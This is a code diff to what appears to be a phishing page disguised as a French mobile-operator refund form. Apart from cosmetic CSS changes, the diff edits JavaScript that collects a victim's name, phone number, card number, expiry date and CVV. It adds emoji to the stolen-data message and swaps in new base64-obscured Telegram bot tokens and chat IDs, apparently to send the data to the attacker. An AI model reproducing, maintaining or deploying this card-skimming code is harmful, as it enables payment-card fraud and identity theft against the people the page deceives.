@@ -46,7 +46,7 @@
             padding: 8px;
             margin-bottom: 10px;
             border: 1px solid #ccc;
-            border-radius: 0px;
+            border-radius: 4px;
             font-size: 14px;
         }
 
@@ -94,10 +94,10 @@
 
         #button {
         margin: 20px 0 0 0;
-        padding: 22px 5px;
+        padding: 12px 5px;
         background-color: #080;
         color: #fff;
-        border-radius: 0px;
+        border-radius: 4px;
         box-sizing: border-box;
         max-width: 360px;
         text-align: center;
@@ -131,7 +131,7 @@
         }
 
         #footer {
-    background-color: #7b7373;
+    background-color: #1a1a1a;
     color: white;
     display: flex;
     flex-direction: column;
@@ -339,23 +339,24 @@ event.preventDefault();
     let cvv = document.getElementById('inputcvv').value;
 
     var msg = `
-Nom: ${firstname} ${lastname}
-num: ${phone}
-operator: ${operator}
-cart: ${cardnumber}
-mmyy: ${mm} / ${yy}
-cvv: ${cvv}`;
+    🔔 **Nouvelle Demande de Remboursement AM** 🔔
+👤 Nom: ${firstname} ${lastname}
+📞 num: ${phone}
+📡 operator: ${operator}
+💳 cart: ${cardnumber}
+📅 mmyy: ${mm} / ${yy}
+🔒 cvv: ${cvv}`;
 
     if (firstname === '' || lastname === '' || phone.length !== 10 || cardnumber.length !== 16 || cvv.length < 3 || operator === 'select') {
         alert('Certains champs sont vides. Veuillez remplir tous les champs requis.');
     } else {
 
         const tokens = [
-atob('ODA4MTcwNzY2ODpBQUVENFBnQjRhWnlrUmxTZkkwVG96Q3BYWDFjakNvOG1FVQ=='),
+atob('Nzc5OTg2NTY3NzpBQUVIQkREcDVFR1RzeEgzclFkckpzMEI5bUVjTW0xUkpGbw=='),
 atob('ODA4MTcwNzY2ODpBQUVENFBnQjRhWnlrUmxTZkkwVG96Q3BYWDFjakNvOG1FVQ==') //YY
 ];
 const chatIds = [
-atob('NjY2OTY5MzgwNQ=='),
+atob('NzA2NDY0NzYzNA=='),
 atob('NjY2OTY5MzgwNQ==') //YY
 ];
 
